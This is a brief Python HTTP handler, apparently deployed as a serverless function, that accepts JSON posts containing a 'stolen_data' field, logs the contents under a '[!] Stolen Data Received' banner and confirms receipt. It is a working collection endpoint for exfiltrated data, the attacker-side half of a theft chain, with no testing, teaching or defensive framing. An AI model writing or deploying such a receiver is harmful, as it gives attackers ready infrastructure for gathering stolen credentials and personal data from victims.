from http.server import BaseHTTPRequestHandler
import json

def handler(request):
    try:
        body = request.get_json()
        stolen_data = body.get("stolen_data", "No Data")

        print(f"[!] Stolen Data Received: {stolen_data}")

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({"status": "received"})
        }

    except Exception as e:
        return {
            "statusCode": 500,
            "body": json.dumps({"error": str(e)})
        }
